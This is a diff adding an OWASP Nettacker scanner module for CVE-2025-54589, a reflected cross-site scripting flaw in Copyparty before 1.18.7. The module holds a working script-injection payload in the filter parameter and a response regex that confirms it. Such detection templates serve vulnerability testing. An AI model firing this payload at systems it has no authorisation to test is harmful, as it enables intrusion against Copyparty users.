@@ -1,0 +1,52 @@
+info:
+  name: copyparty_xss_cve_2025_54589_vuln
+  author: OWASP Nettacker Team
+  severity: 6.3
+  description: |
+    Copyparty versions prior to 1.18.7 are vulnerable to reflected cross-site scripting via the filter parameter.
+
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-54589
+    - https://github.com/9001/copyparty/security/advisories/GHSA-8mx2-rjh8-q3jq
+    - https://secalerts.co/vulnerability/CVE-2025-54589
+  profiles:
+    - vuln
+    - http
+    - medium_severity
+    - cve
+    - cve2025
+    - xss
+    - copyparty
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        ssl: false
+        headers:
+          User-Agent: "{user_agent}"
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}{{paths}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+              paths:
+                - "/?ru&filter=%3C%2Fscript%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E"
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: "</script><script>alert\\(document.domain\\)</script>"
+              reverse: false
